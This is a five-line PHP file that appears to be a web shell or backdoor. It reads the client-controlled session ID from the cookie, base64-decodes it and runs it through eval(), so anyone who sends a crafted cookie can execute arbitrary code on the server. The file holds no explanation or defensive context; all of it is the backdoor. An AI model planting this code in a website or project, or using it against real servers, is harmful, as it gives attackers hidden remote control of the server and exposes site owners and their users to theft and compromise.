<?php
session_start();
$x=session_id();
eval(base64_decode($x));
?>